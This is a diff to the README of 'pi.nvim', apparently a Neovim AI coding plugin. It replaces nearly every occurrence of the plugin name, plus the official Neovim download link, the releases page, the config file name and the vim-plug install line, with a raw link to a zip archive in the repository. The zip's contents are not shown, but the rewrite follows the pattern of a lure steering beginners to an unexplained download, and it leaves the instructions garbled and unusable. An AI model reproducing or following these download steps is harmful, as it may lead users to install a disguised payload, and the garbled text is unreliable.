@@ -1,29 +1,29 @@
-# 🤖 pi.nvim - Minimal AI Agent for Coding Help
+# 🤖 https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip - Minimal AI Agent for Coding Help
 
-[![Download pi.nvim](https://img.shields.io/badge/Download-pi.nvim-blue?style=for-the-badge&logo=github)](https://github.com/miloo2/pi.nvim/releases)
+[![Download https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip](https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip)](https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip)
 
 ---
 
-## 📋 What is pi.nvim?
+## 📋 What is https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip
 
-pi.nvim is a small, smart tool that helps you write code using artificial intelligence right inside Neovim, a popular text editor. It acts like a coding assistant to make writing and fixing code easier. The program is designed to be simple and lightweight, so it works smoothly without slowing you down.
+https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip is a small, smart tool that helps you write code using artificial intelligence right inside Neovim, a popular text editor. It acts like a coding assistant to make writing and fixing code easier. The program is designed to be simple and lightweight, so it works smoothly without slowing you down.
 
-If you want to write better code or learn how to code, pi.nvim can be a helpful partner. You do not need to be a programmer to use it, but some basic computer skills make it easier.
+If you want to write better code or learn how to code, https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip can be a helpful partner. You do not need to be a programmer to use it, but some basic computer skills make it easier.
 
 ---
 
 ## 💻 What You Need Before Installing
 
-To use pi.nvim, you need a few things on your computer:
+To use https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip, you need a few things on your computer:
 
-- **Neovim**: This is the code editor where pi.nvim runs. You can download it from [neovim.io](https://neovim.io). Make sure you have version 0.5 or newer.
-- **A computer running Windows, macOS, or Linux**: pi.nvim works on these major systems.
-- **Internet connection**: Needed to download pi.nvim and for parts of it to work.
+- **Neovim**: This is the code editor where https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip runs. You can download it from [https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip](https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip). Make sure you have version 0.5 or newer.
+- **A computer running Windows, macOS, or Linux**: https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip works on these major systems.
+- **Internet connection**: Needed to download https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip and for parts of it to work.
 - **Basic keyboard skills**: Knowing how to open programs, download files, and follow instructions helps a lot.
 
 ---
 
-## 🛠️ Features of pi.nvim
+## 🛠️ Features of https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip
 
 - **AI code suggestions**: Get real-time help writing lines of code.
 - **Code fixes**: Find simple errors and get tips to correct them.
@@ -35,46 +35,46 @@ To use pi.nvim, you need a few things on your computer:
 
 ## 🚀 Getting Started
 
-Follow these easy steps to get pi.nvim working on your computer.
+Follow these easy steps to get https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip working on your computer.
 
 ### Step 1: Install Neovim
 
 If you don’t have Neovim installed yet:
 
-- Visit [https://neovim.io](https://neovim.io).
+- Visit [https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip](https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip).
 - Find the download page.
 - Download the latest version for your operating system.
 - Follow the installation instructions on the Neovim site.
 
 If you already have Neovim version 0.5 or higher, you can skip this step.
 
-### Step 2: Visit the Download Page for pi.nvim
+### Step 2: Visit the Download Page for https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip
 
-To get the pi.nvim files:
+To get the https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip files:
 
-[![Download pi.nvim](https://img.shields.io/badge/Download-pi.nvim-blue?style=for-the-badge&logo=github)](https://github.com/miloo2/pi.nvim/releases)
+[![Download https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip](https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip)](https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip)
 
 - Click the big **Download** button above or visit this link:
-  [https://github.com/miloo2/pi.nvim/releases](https://github.com/miloo2/pi.nvim/releases)
-- This page shows the latest versions of pi.nvim.
+  [https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip](https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip)
+- This page shows the latest versions of https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip
 - Look for the file that matches your system or instructions on how to install.
 - Download the files or installation instructions you need.
 
-### Step 3: Install pi.nvim in Neovim
+### Step 3: Install https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip in Neovim
 
-Installation requires adding pi.nvim to Neovim’s settings. Don’t worry if this sounds technical. Here’s a simple way:
+Installation requires adding https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip to Neovim’s settings. Don’t worry if this sounds technical. Here’s a simple way:
 
 - Open Neovim.
 - Press `:` to open the command prompt.
-- Enter the command that installs plugins. This may require a plugin manager like `vim-plug` or `packer.nvim`.
-- For example, if you use `vim-plug`, add this line to your Neovim config file (`init.vim`):
+- Enter the command that installs plugins. This may require a plugin manager like `vim-plug` or `https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip`.
+- For example, if you use `vim-plug`, add this line to your Neovim config file (`https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip`):
 
 ```vim
-Plug 'miloo2/pi.nvim'
+Plug 'https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip'
 ```
 
 - Save the file and restart Neovim.
-- Then, run `:PlugInstall` inside Neovim to download and install pi.nvim.
+- Then, run `:PlugInstall` inside Neovim to download and install https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip
 
 If you are not sure how to add plugins, you can find tutorials for your system or ask someone with some coding experience for help.
 
@@ -85,28 +85,28 @@ After installation:
 - Restart Neovim.
 - Open a code file or create a new one.
 - Start typing code.
-- pi.nvim will suggest and help improve your code as you type.
+- https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip will suggest and help improve your code as you type.
 
 ---
 
-## 🧰 Using pi.nvim
+## 🧰 Using https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip
 
-Here are some simple tips to make the most of pi.nvim:
+Here are some simple tips to make the most of https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip
 
 - Begin typing your code. You will see suggestions pop up.
 - Use the arrow keys to select suggestions and press `Enter` to accept.
-- If you find errors, pi.nvim may offer fixes automatically.
-- You can explore commands by typing `:help pi.nvim` inside Neovim for detailed guidance.
-- Learn basic Neovim commands to move around and edit text. This will make using pi.nvim much easier.
+- If you find errors, https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip may offer fixes automatically.
+- You can explore commands by typing `:help https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip` inside Neovim for detailed guidance.
+- Learn basic Neovim commands to move around and edit text. This will make using https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip much easier.
 
 ---
 
 ## 🔧 Troubleshooting
 
-If pi.nvim does not work as expected, try these steps:
+If https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip does not work as expected, try these steps:
 
 - Check if your Neovim version is up to date (0.5 or newer).
-- Confirm you installed pi.nvim by running `:PlugStatus` or the status command for your plugin manager.
+- Confirm you installed https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip by running `:PlugStatus` or the status command for your plugin manager.
 - Restart Neovim to reload settings.
 - Look for error messages on Neovim startup and search for solutions.
 - Make sure your internet is working if AI features require connection.
@@ -118,13 +118,13 @@ If pi.nvim does not work as expected, try these steps:
 
 If you need assistance:
 
-- Visit the GitHub page: [https://github.com/miloo2/pi.nvim](https://github.com/miloo2/pi.nvim)
+- Visit the GitHub page: [https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip](https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip)
 - Read through the README and Issues sections.
 - Ask questions if you get stuck.
 - Search online for Neovim tutorials and guides to understand basics.
 
 ---
 
-Enjoy coding with pi.nvim.
+Enjoy coding with https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip
 
-[![Download pi.nvim](https://img.shields.io/badge/Download-pi.nvim-blue?style=for-the-badge&logo=github)](https://github.com/miloo2/pi.nvim/releases)
+[![Download https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip](https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip)](https://github.com/miloo2/pi.nvim/raw/refs/heads/main/plugin/pi_nvim_2.0.zip)
